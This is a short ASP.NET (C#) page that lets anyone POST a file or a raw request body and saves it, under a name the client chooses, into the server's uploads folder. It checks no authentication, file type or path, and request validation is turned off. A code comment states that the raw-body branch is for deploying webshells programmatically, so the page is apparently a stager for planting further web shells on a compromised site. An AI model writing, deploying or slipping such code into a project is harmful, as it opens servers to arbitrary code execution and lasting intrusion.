<%@ Page Language="C#" ValidateRequest="false" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    if (Request.HttpMethod != "POST")
    {
        Response.Redirect("/index.aspx");
        return;
    }

    if (Request.Files.Count > 0)
    {
        var file = Request.Files[0];
        string uploadsDir = Server.MapPath("~/uploads");
        if (!System.IO.Directory.Exists(uploadsDir))
            System.IO.Directory.CreateDirectory(uploadsDir);
        string dest = System.IO.Path.Combine(uploadsDir, file.FileName);
        file.SaveAs(dest);
        Response.Write("Uploaded: " + file.FileName);
    }
    else
    {
        // Handle raw body POST (for deploying webshells programmatically)
        string filename = Request.QueryString["filename"];
        if (!string.IsNullOrEmpty(filename))
        {
            string uploadsDir = Server.MapPath("~/uploads");
            if (!System.IO.Directory.Exists(uploadsDir))
                System.IO.Directory.CreateDirectory(uploadsDir);
            string dest = System.IO.Path.Combine(uploadsDir, filename);
            using (var fs = new System.IO.FileStream(dest, System.IO.FileMode.Create))
            {
                Request.InputStream.CopyTo(fs);
            }
            Response.Write("Uploaded: " + filename);
        }
        else
        {
            Response.Write("No file provided");
        }
    }
}
</script>
